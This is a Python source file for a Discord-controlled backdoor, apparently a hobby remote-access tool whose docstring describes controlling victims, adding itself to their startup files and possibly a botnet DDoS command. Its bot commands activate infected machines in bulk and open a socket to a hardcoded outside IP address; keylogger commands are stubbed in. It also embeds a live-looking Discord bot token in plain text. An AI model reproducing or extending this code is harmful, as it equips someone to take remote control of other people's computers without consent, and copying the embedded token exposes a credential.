"""
so this is my creative way to dealing with blocked sockets, multiple clients, etc. This controller will
be persistent even if there is an exception wihtin the socket connection i can easily use the controller to
reconnect with client. Also provides me a way to destroy this application by simply invalidating my token if this
code is ever leaked. Basic backdoor control will be provided at this level and user can use socket connection to
initiate more complex functionality. Depending how deep i go down this rabbit hole i might add this process to vitim
startup file to make it persistent through restarts. may also implement a botnet ddos command which will be illegal to
test so probably wont end up doing that unless im interested in crashing my own internet.
"""
from discord.ext import commands
from Client import Client
import sys
import discord
import getpass
import random
import threading

# putting my API token here I can regenerate and invalidate this one it if this code is ever leaked and used malliciously.
TOKEN = "ODM0OTA2MDQ1MDYyMTg0OTkx.YIHs2A.fqZvw5tlT9NLBCVtczXVKfmrNNY"
bot = commands.Bot(command_prefix='!')
#create way for bot to identify itself off username and random int(posibility of duplicate usernames)
botID = getpass.getuser() + str(random.randint(0, 10))
activated = False
#variable to flag to socket threads to close, may not use.
threadsExit = False
controllerVersion = "V1.0"

@bot.command("ping")
async def ping(ctx):
    await ctx.send(str(botID))

@bot.command("ver")
async def ver(ctx):
    global activated
    if activated:
        await ctx.send(controllerVersion)

#kills any bot
@bot.command("kill")
async def kill(ctx, ID = ""):
    if botID == ID:
        await ctx.send("controller " + str(botID) + " is closing.")
        sys.exit(0)

#activates a bot into a ready state to respond to more specific commands. if used malliciously this would essentially allow control of an entire botnet at once.
@bot.command("act")
async def activate(ctx, ID = ""):
    global activated
    if botID == ID:
        activated = True
        await ctx.send("controller " + str(botID) + " is now activated and will respond to specific commands")

#deactivates bot. will only respond to ping with its ID
@bot.command("dact")
async def deactivate(ctx, ID = ""):
    global activated
    if botID == ID:
        activated = False
        await ctx.send("controller " + str(botID) + " deactivated and will respond to ping only")

#command for directing controller to open new socket connection
@bot.command("servsoc")
async def servsoc(ctx, IP="23.123.182.6", PORT=7771):
    global activated
    if activated:
        threading.Thread(target=Client.connectToServer, args=(IP, PORT)).start()
        await ctx.send(f"Bot {botID} has opened a new socket to {IP}:{PORT} its time for anarchy!")

#command for starting keylogger to report new keys ever 60 seconds:
@bot.command("startlog")
async def startlog(ctx):
    global activated
    if activated:
        print()
#command to stop keylogging
@bot.command("stoplog")
async def stoplog(ctx):
    global activated
    if activated:
        print()
#version control command
def start():
    bot.run(TOKEN)

if __name__ == '__main__':
    start()

